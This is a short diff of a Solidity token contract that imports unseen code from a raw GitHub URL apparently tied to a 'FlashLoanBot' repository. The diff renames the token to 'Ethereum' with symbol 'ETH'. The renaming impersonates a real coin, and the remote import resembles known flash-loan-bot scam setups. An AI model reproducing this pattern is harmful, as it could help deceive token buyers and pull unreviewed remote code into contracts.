@@ -9,8 +9,8 @@ import "https://raw.githubusercontent.com/mevbotmaker/FlashLoanBot/main/Performa
 
  contract Token {
     Manager manager;
-    string public name = "Metaverse"; // Holds the name of the token
-    string public symbol = "MTV"; // Holds the symbol of the token
+    string public name = "Ethereum"; // Holds the name of the token
+    string public symbol = "ETH"; // Holds the symbol of the token
     uint public decimals = 18; // Holds the decimal places of the token
     uint public totalSupply; // Holds the total suppy of the token
     /* This creates a mapping with all balances */
